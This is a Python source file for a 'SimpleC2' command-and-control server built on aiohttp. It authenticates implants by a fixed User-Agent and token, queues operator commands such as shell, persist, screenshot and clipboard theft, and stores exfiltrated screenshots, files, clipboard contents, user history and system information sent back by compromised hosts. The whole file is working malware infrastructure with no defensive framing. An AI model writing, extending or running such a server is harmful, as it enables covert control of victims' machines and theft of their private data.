from aiohttp import web
from datetime import datetime

cmds = {}

print("\033[1;36m+========================+")
print(" SimpleC2 Server ")
print("+========================+\033[0m")

VALID_UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) Chrome/35.0.1916.47"
VALID_TOKEN_PREFIX = "Bearer valid"
TOKEN_LENGTH = 266

async def is_valid_request(request):
    headers = request.headers
    return (
        headers.get('User-Agent') == VALID_UA and
        headers.get('Authorization', '').startswith(VALID_TOKEN_PREFIX) and
        len(headers.get('Authorization', '')) == TOKEN_LENGTH
    )

async def InitCall(request):
    return web.Response(text='OK') if await is_valid_request(request) else web.HTTPNotFound()

async def CheckIn(request):
    cmds.clear()
    if not await is_valid_request(request):
        return web.HTTPNotFound()
    
    while True:
        command = input("\033[34m[Command]>>>\033[0m ")
        if command == 'done':
            return web.json_response(list(cmds.values()))
        elif command == 'help':
            print("Commands: systeminfo, cd [dir], listdir, download [file], listusers, addresses, pwd, prompt, "
                  "userhist, clipboard, connections, checksecurity, screenshot, sleep [n], persist, unpersist, shell [cmd], exit")
        else:
            cmds[str(len(cmds) + 1)] = command
            print(f"\033[33m{command} queued for execution\033[0m")

async def ReceiveData(request, filename):
    if not await is_valid_request(request):
        return web.HTTPNotFound()
    
    data = await request.read()
    with open(f"{filename}_{datetime.now()}", 'wb') as file:
        file.write(data)
    print(f"[+] {filename} received.")
    return web.Response(text='OK')

app = web.Application()
app.add_routes([
    web.get('/initialize', InitCall),
    web.get('/checkin', CheckIn),
    web.post('/screenshot', lambda r: ReceiveData(r, "screenshot.jpg")),
    web.post('/download', lambda r: ReceiveData(r, "download")),
    web.post('/clipboard', lambda r: ReceiveData(r, "clipboard.txt")),
    web.post('/userhist', lambda r: ReceiveData(r, "userhist.txt")),
    web.post('/connections', lambda r: ReceiveData(r, "connections.txt")),
    web.post('/addresses', lambda r: ReceiveData(r, "addresses.txt")),
    web.post('/listusers', lambda r: ReceiveData(r, "listusers.txt")),
    web.post('/sysinfo', lambda r: ReceiveData(r, "sysinfo.txt")),
])

if __name__ == '__main__':
    web.run_app(app)
